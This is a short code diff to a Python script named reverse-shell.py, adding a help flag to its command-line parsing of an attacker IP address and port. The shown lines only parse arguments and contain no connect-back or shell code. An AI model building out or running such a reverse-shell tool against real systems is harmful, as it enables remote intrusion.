@@ -33,11 +33,14 @@ def main():
     Port = None
     argv = sys.argv[1:]
     try:
-        opts, args = getopt.getopt(argv, "i:p:")
+        opts, args = getopt.getopt(argv, "i:p:h:")
     except:
         print("[!] Format not valid. reverse-shell.py -i <IP Address of Attacker> -p <Port Number>")  
     for opt, arg in opts:
-        if opt in ['-i']:
+        if opt in ['-h']:
+            print(f"[*] Format used = ./reverse-shell.py -i <IP Address of Attacker> -p <Port Number> ")
+            break
+        elif opt in ['-i']:
             ipAddr = arg
         elif opt in ['-p']:
             Port = int(arg)
